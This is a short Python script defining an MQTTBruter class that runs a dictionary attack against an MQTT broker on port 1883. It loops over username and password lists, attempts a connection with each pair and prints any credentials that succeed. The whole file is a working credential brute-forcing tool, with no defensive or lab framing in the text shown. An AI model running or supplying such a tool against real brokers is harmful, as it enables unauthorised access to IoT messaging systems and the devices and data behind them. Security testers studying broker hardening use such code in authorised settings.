import paho.mqtt.client as mqtt
import time

class MQTTBruter:
    def __init__(self, broker_ip):
        self.broker_ip = broker_ip
        self.found_credentials = None

    def attempt_auth(self, username, password):
        """Tests a single username/password pair."""
        client = mqtt.Client()
        try:
            client.username_pw_set(username, password)
            # Try to connect with a 2-second timeout
            result = client.connect(self.broker_ip, 1883, 2)
            if result == 0:
                client.disconnect()
                return True
        except:
            pass
        return False

    def run_wordlist(self, user_list, pass_list):
        """Runs a dictionary attack against the broker."""
        print(f"[*] Starting Brute Force on {self.broker_ip}...")
        for user in user_list:
            for pwd in pass_list:
                if self.attempt_auth(user, pwd):
                    print(f"[!] SUCCESS: Found credentials -> {user}:{pwd}")
                    self.found_credentials = (user, pwd)
                    return self.found_credentials
        print("[-] Brute force failed. No credentials found.")
        return None
